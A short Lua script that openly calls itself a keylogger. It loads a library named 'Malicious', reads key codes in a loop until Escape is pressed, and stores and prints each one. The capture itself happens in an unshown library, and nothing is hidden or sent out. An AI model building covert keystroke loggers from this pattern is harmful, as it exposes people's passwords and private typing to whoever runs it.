local mylib = require("Malicious")

function keylogger()
	
	local Pressed = {}

	while true do
		local key = mylib.pegaChave()

		if(key==27) then
			break
		end

		table.insert(Pressed,key)

		print(key);

	end

	return Pressed

end